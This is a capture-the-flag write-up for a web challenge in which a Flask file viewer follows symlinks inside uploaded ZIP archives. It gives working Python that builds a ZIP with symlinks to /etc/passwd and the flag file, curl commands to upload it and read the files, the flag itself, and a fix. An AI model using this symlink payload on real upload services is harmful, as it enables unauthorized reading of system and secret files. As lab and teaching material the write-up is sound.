---
title: "File Viewer"
category: "Web"
tags: []
solve_date: "2026-10-31"
language: "en"
---

# File Viewer

## Challenge

A Flask/Werkzeug file viewer extracts uploaded ZIP archives and serves each extracted file through a `/<id>/<filename>` link. The extractor preserves ZIP symlink entries, and Werkzeug's `safe_join` checks the path string without resolving symlinks. A symlink inside the archive can therefore point outside the extraction directory and read arbitrary files, including `/app/flag.txt`.

## Solution

### Step 1: Confirm the symlink escape

Upload a ZIP containing a symlink entry whose target is `/etc/passwd`:

```python
import zipfile

z = zipfile.ZipFile('probe.zip', 'w')
for name, target in {'passwd': '/etc/passwd', 'flag2': '/app/flag.txt'}.items():
    zi = zipfile.ZipInfo(name)
    zi.external_attr = (0o120777 << 16)  # symlink
    z.writestr(zi, target)
z.close()
```

Upload it:

```bash
curl -sk -F "file=@probe.zip" https://file-viewer-.../analyze
```

The response lists links such as `/<id>/passwd` and `/<id>/flag2`. Requesting `/<id>/passwd` returns `/etc/passwd`, confirming that the symlink is followed outside the extraction directory.

### Step 2: Read the flag

Request the link for the symlink pointing at `/app/flag.txt`:

```bash
curl -sk https://file-viewer-.../<id>/flag2
# hiCTF{E45Y_5yml1Nk_69561eb663}
```

Notes:

- `/proc/self/environ` and `/proc/self/cmdline` came back empty because `send_file` treated the zero-size proc files as empty.
- `/flag` and `/flag.txt` do not exist; the flag is at `/app/flag.txt`.

### Fix

Reject ZIP entries whose `external_attr` marks them as symlinks (or drop `S_ISLNK` entries), and resolve the served path with `os.path.realpath` before checking that it remains inside the upload directory.

## Result

```
hiCTF{E45Y_5yml1Nk_69561eb663}
```
